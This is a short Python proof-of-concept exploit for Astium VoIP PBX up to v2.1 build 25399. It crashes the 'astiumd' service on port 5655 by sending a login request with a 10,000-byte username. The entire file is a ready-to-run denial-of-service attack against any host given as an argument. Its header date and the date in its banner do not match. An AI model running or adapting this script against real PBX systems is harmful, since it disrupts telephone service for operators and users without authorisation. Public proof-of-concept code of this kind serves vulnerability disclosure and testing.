#!/usr/bin/python
#+--------------------------------------------------------------------------------------------------------------------------------+
# Exploit Title     : Astium VoIP PBX <= v2.1 build 25399 Remote Crash PoC
# Date              : 01-02-2012
# Author            : xistence (xistence<[AT]>0x90.nl)
# Software link     : http://www.oneip.nl/telefonie-oplossingen/ip-telefooncentrale/astium-downloaden-en-installeren/?lang=en
# Vendor site       : http://www.oneip.nl/
# Version           : v2.1 build 25399
# Tested on         : CentOS 5.x 32-bit
#
# Vulnerability	    : The "astiumd" service on port 5655 crashes and restarts when sending a large buffer.
#		     
#		      Entries in /var/log/astiumd.log after executing script:
#                     Astiumd ended with exit status 139 <-- Segmentation Fault
#		      Automatically restarting Astiumd
#+--------------------------------------------------------------------------------------------------------------------------------+


import socket, sys

port = 5655
payload = "\x41"*10000

print ""
print "[*] Astium VoIP PBX <= v2.1 build 25399 Remote Crash PoC - xistence - xistence[at]0x90[.]nl - 2013-01-02"
print ""

if (len(sys.argv) != 2):
    print "[*] Usage: " + sys.argv[0] + " <RHOST>"
    print ""
    exit(0)

rhost = sys.argv[1]

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost,port))
        data = s.recv(1024)
        print "[*] %s" %data
	print "[*] Sending payload!"
        s.send("Action: Login\r\n")
        s.send("Username: " + payload + "\r\n")
        s.send("Secret: hax0r\r\n")
        s.send("\r\n")
	s.close()
except:
	print "Error!"
